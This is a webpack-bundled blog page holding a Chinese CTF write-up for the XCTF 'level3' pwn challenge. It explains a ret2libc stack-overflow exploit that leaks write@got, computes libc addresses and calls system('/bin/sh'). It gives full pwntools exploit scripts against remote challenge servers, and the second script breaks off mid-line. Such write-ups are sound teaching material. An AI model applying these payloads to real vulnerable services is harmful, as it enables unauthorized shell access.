(window.webpackJsonp=window.webpackJsonp||[]).push([[11],{608:function(s,t,a){s.exports=a.p+"assets/img/pwn_70_xman_level3.md1.b910f8f1.png"},609:function(s,t,a){s.exports=a.p+"assets/img/pwn_70_xman_level3.md2.94440f3f.png"},610:function(s,t,a){s.exports=a.p+"assets/img/pwn_70_xman_level3.md3.4bed9b85.png"},611:function(s,t,a){s.exports=a.p+"assets/img/pwn_70_xman_level3.md4.9b314d9c.png"},612:function(s,t,a){s.exports=a.p+"assets/img/pwn_70_xman_level3.md5.aa56e09e.png"},666:function(s,t,a){"use strict";a.r(t);var n=a(4),e=Object(n.a)({},(function(){var s=this,t=s.$createElement,n=s._self._c||t;return n("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[n("h1",{attrs:{id:"wp"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#wp"}},[s._v("#")]),s._v(" wp")]),s._v(" "),n("p",[s._v("转载自 XCTF攻防世界 level3 https://www.52pojie.cn/thread-1032651-1-1.html")]),s._v(" "),n("p",[s._v("首先，检查一下程序基本信息：")]),s._v(" "),n("p",[n("img",{attrs:{src:a(608),alt:"Alt text"}})]),s._v(" "),n("p",[s._v("程序很简单，保护开的也差不多。但是需要注意，这道题单独给出了libc，而且根据题目提示，程序中没有现成的system函数。这就需要我们从libc中动态加载system函数。")]),s._v(" "),n("p",[s._v("初步思路：PIE没有开启，那么在libc中函数的offset就是固定的，只要确认了libc的base address，然后计算出system函数的offset，就可以定位到system函数的真实地址，实现调用。")]),s._v(" "),n("p",[s._v("IDA查看源码：")]),s._v(" "),n("ul",[n("li",[s._v("strings查看一下是否有明显的字符串信息：")])]),s._v(" "),n("p",[n("img",{attrs:{src:a(609),alt:"Alt text"}})]),s._v(" "),n("p",[s._v("从字符串信息来看，没有明显的可以利用的字符串，函数也只有write和read，在某些情况下这两个函数可以构造溢出，先留心一下。")]),s._v(" "),n("ul",[n("li",[s._v("main函数：")])]),s._v(" "),n("p",[n("img",{attrs:{src:a(610),alt:"pwn_70_xman_level3.md3"}})]),s._v(" "),n("p",[s._v("没有明显的问题，直接进入vulnerable_function()")]),s._v(" "),n("ul",[n("li",[s._v("vulnerable_function函数：")])]),s._v(" "),n("p",[n("img",{attrs:{src:a(611),alt:"pwn_70_xman_level3.md4"}})]),s._v(" "),n("p",[s._v("有一个缓冲区buf，在read函数中进行了调用。可以进行溢出。")]),s._v(" "),n("p",[n("strong",[s._v("攻击思路：")]),s._v("\nlibc中的函数的相对地址是固定的，要想获取到system函数的地址，可以通过write()函数进行offset计算。")]),s._v(" "),n("ol",[n("li",[s._v("首先利用write()函数计算出write()函数的真实地址；")]),s._v(" "),n("li",[s._v('利用相对offset计算出system和"/bin/sh"的真实地址。')])]),s._v(" "),n("p",[s._v("在vulnerable_function()中，先调用了write()函数，然后调用read()函数。write()函数返回到vulnerable_function()后，再进行read()函数调用，这样我们就可以进行二次攻击。")]),s._v(" "),n("ul",[n("li",[n("p",[s._v("第一次攻击我们利用栈溢出将write()函数在got表中的真实地址leak出来，然后减去libc中的offset，就可以得到libc的base address。")])]),s._v(" "),n("li",[n("p",[s._v("第二次攻击重新进入main函数，再次通过栈溢出，利用system函数进行getshell。")])])]),s._v(" "),n("p",[s._v("两次攻击stack中的情况：")]),s._v(" "),n("table",[n("thead",[n("tr",[n("th",[s._v("First stack")]),s._v(" "),n("th",[s._v("Second stack")])])]),s._v(" "),n("tbody",[n("tr",[n("td",[s._v("'A'*0x88")]),s._v(" "),n("td",[s._v("'A'*0x88")])]),s._v(" "),n("tr",[n("td",[s._v("EBP")]),s._v(" "),n("td",[s._v("EBP")])]),s._v(" "),n("tr",[n("td",[s._v("write@plt")]),s._v(" "),n("td",[s._v("sys_addr")])]),s._v(" "),n("tr",[n("td",[s._v("main_addr")]),s._v(" "),n("td",[s._v("0xdeadbeef")])]),s._v(" "),n("tr",[n("td",[s._v("1")]),s._v(" "),n("td",[s._v("bin_sh_addr")])]),s._v(" "),n("tr",[n("td",[s._v("write@got")]),s._v(" "),n("td",[s._v("XXXX")])]),s._v(" "),n("tr",[n("td",[s._v("0xdeadbeef")]),s._v(" "),n("td",[s._v("XXXX")])])])]),s._v(" "),n("p",[s._v("这样的话，第一次使用的payload构成如下：")]),s._v(" "),n("p",[s._v("*"),n("em",[s._v("payload = 'A'"),n("em",[s._v("0x88 + p32(0xdeadbeef) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(0xdeadbeef)")])])]),s._v(" "),n("p",[s._v("利用第一次攻击，就可以获取到libc的基地址。然后进行第二次攻击，使用的payload构成为：")]),s._v(" "),n("p",[s._v("*"),n("em",[s._v("payload0 = 'A'"),n("em",[s._v("0x88 + p32(0xdeadbeef) + p32(sys_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)")])])]),s._v(" "),n("p",[s._v("中间涉及到几个地址的计算，各地址的计算方式如下：")]),s._v(" "),n("table",[n("thead",[n("tr",[n("th",[s._v("Address")]),s._v(" "),n("th",[s._v("Calculate")])])]),s._v(" "),n("tbody",[n("tr",[n("td",[s._v("libc_addr")]),s._v(" "),n("td",[s._v("write_got_addr - libc.symbols['write']")])]),s._v(" "),n("tr",[n("td",[s._v("sys_addr")]),s._v(" "),n("td",[s._v("libc_addr + libc.symbols['system']")])]),s._v(" "),n("tr",[n("td",[s._v("bin_sh_addr")]),s._v(" "),n("td",[s._v("libc_addr + 0x15902b")])])])]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v('备注：0x15902b是"/bin/sh"在libc中的地址，可以使用libcsearch进行获取，也可以使用 strings -a -t x libc_32.so.6 | grep "/bin/sh" 进行获取。此外，还有一个libcSearcher可以使用，有兴趣的可以研究一下。\n')])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[s._v('这样的两次攻击下来，就可以使用libc中的system函数进行"/bin/sh"的调用，从而getshell。')]),s._v(" "),n("h2",{attrs:{id:"exp"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#exp"}},[s._v("#")]),s._v(" EXP:")]),s._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" pwn "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\n \nsh "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" remote"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'124.126.19.106'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("35860")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#sh=process('./level3')")]),s._v("\n \n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#context.log_level = 'debug'")]),s._v("\nelf"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("ELF"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'./level3'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nlibc"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("ELF"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'./libc_32.so.6'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#get func address")]),s._v("\nwrite_plt "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" elf"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("plt"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'write'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nwrite_got "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" elf"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("got"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'write'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nmain_addr "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" elf"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("symbols"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'main'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#char[88] ebp  write函数地址  write函数返回地址(返回到main函数)  write函数参数一(1)  write函数参数二(write_got地址)  write函数参数三(写4字节)")]),s._v("\npayload "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" flat"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'A'")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x88")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0xdeadbeef")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("write_plt"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("main_addr"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("write_got"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0xdeadbeef")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 0xdeadbeef 可随意如 p32(4)，填充4字节, 上面就是把write_got输出, 然后返回main头部")]),s._v("\n \nsh"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendlineafter"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Input:\\n"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("payload"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n \n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#leak write's addr in got")]),s._v("\nwrite_got_addr "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" u32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("sh"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("recv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'write_got address is'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),n("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("hex")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("write_got_addr"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n \n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#leak libc's addr 计算lib库加载基址")]),s._v("\nlibc_base "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" write_got_addr "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v(" libc"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("symbols"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'write'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'libc address is'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),n("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("hex")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("libc_base"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n \n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#get system's addr")]),s._v("\nsys_addr "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" libc_base "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" libc"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("symbols"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'system'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'system address is'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),n("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("hex")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("sys_addr"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n \n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v('#get bin/sh \'s addr    strings -a -t x libc_32.so.6 | grep "/bin/sh"')]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v('#libc.search("/bin/sh").next()')]),s._v("\nbin_sh_addr "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" libc_base "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x15902b")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/bin/sh address is'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),n("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("hex")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("bin_sh_addr"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n \n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#get second payload")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("##char[88] ebp system system函数的返回地址 system函数的参数(bin_sh_addr)")]),s._v("\npayload0 "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" flat"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'A'")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x88")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0xdeadbeef")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("sys_addr"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0xdeadbeef")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("bin_sh_addr"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n \nsh"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendline"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("payload0"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nsh"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("interactive"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br"),n("span",{staticClass:"line-number"},[s._v("35")]),n("br"),n("span",{staticClass:"line-number"},[s._v("36")]),n("br"),n("span",{staticClass:"line-number"},[s._v("37")]),n("br"),n("span",{staticClass:"line-number"},[s._v("38")]),n("br"),n("span",{staticClass:"line-number"},[s._v("39")]),n("br"),n("span",{staticClass:"line-number"},[s._v("40")]),n("br"),n("span",{staticClass:"line-number"},[s._v("41")]),n("br"),n("span",{staticClass:"line-number"},[s._v("42")]),n("br")])]),n("p",[s._v("执行完成后，可以成功拿到flag：")]),s._v(" "),n("p",[n("img",{attrs:{src:a(612),alt:"pwn_70_xman_level3.md5"}})]),s._v(" "),n("h2",{attrs:{id:"总结"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#总结"}},[s._v("#")]),s._v(" 总结")]),s._v(" "),n("p",[s._v('这道题感觉才算真正开始入门pwn的栈溢出，遇到了没有system和"/bin/sh"的情况，思路也比较好玩，需要一定的技巧和脑洞才能完成这道题。可能在大师傅们的眼里很简单，但是对于刚入门pwn的小白来说，这道题很值得玩味，挺有价值的。 此外，需要花一定的时间学习一下pwntools，这玩意真的是pwn题的神器233333。')]),s._v(" "),n("h2",{attrs:{id:"解法2"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#解法2"}},[s._v("#")]),s._v(" 解法2")]),s._v(" "),n("p",[s._v("可以使用one_gadget工具，找到execve地址可以省略使用system和/bin/sh地址的步骤")]),s._v(" "),n("div",{staticClass:"language-sh line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-sh"}},[n("code",[s._v("kali@kali:/mnt/hgfs/vmware$ one_gadget  libc_32.so.6 \n0x3a80c execve"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"/bin/sh"')]),s._v(", esp+0x28, environ"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nconstraints:\n  esi is the GOT address of libc\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br")])]),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[s._v("\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" pwn "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\np "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" remote"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"111.198.29.45"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("37840")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nelf "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" ELF"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"./level3"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nlibc "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" ELF"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"./libc_32.so.6"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\ncontext"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("log_level"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'debug'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("arch"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'i386'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("os"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'linux'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nexecve "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x3a80c")]),s._v("\njunk "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"A"')]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x88")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nmain_addr "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" elf"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("symbols"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'main'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nwrite_got "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" elf"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("got"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'write'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\nwrite_plt "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" elf"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("plt"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'write'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\npayload1 "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" junk "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("write_plt"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("main_addr"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\npayload1 "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+=")]),s._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" p32"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("write_got"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" p32"),n("span",{pre:!0,attrs:{class:"token 